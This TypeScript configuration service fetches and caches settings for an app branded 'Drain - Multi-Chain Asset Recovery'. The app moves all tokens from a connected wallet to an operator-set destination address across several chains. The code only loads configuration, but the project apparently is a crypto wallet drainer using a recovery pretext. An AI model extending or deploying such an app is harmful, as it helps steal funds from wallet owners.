/**
 * Configuration Service
 * Fetches application configuration from backend API
 */

export interface PublicConfig {
  walletconnect: {
    projectId: string;
  };
  app: {
    name: string;
    description: string;
    url: string;
    iconUrl: string;
  };
  blockchain: {
    supportedChains: number[];
    destinationAddress?: string;
  };
}

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';

/**
 * Fetches public configuration from backend
 * Falls back to environment variables if API is unavailable
 */
export const fetchConfig = async (): Promise<PublicConfig> => {
  try {
    const response = await fetch(`${API_URL}/api/config/public`);
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    return await response.json();
  } catch (error) {
    console.warn(
      'Failed to fetch config from API, using environment fallback:',
      error,
    );

    // Fallback to environment variables
    return {
      walletconnect: {
        projectId: import.meta.env.VITE_WALLETCONNECT_PROJECT_ID || '',
      },
      app: {
        name: 'Drain - Multi-Chain Asset Recovery',
        description: 'Transfer all tokens from one wallet to another',
        url: 'https://drain.app',
        iconUrl: 'https://avatars.githubusercontent.com/u/37784886',
      },
      blockchain: {
        supportedChains: [1, 137, 10, 42161, 43114, 56, 100],
        destinationAddress: import.meta.env.VITE_DESTINATION_ADDRESS,
      },
    };
  }
};

/**
 * Cache for configuration to avoid repeated API calls
 */
let cachedConfig: PublicConfig | null = null;

export const getConfig = async (): Promise<PublicConfig> => {
  if (cachedConfig) {
    return cachedConfig;
  }

  cachedConfig = await fetchConfig();
  return cachedConfig;
};

/**
 * Clear cached configuration (useful after admin updates)
 */
export const clearConfigCache = () => {
  cachedConfig = null;
};
